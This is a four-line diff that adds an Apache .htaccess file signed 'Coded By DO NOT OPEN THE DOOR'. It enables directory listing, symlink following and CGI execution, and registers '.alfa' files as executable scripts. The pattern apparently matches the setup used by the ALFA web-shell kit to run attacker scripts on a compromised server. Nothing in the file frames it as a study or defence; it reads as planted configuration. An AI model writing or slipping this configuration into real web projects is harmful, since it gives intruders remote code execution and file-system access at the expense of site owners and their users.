@@ -1,0 +1,4 @@
+#Coded By DO NOT OPEN THE DOOR
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .alfa
+AddHandler cgi-script .alfa
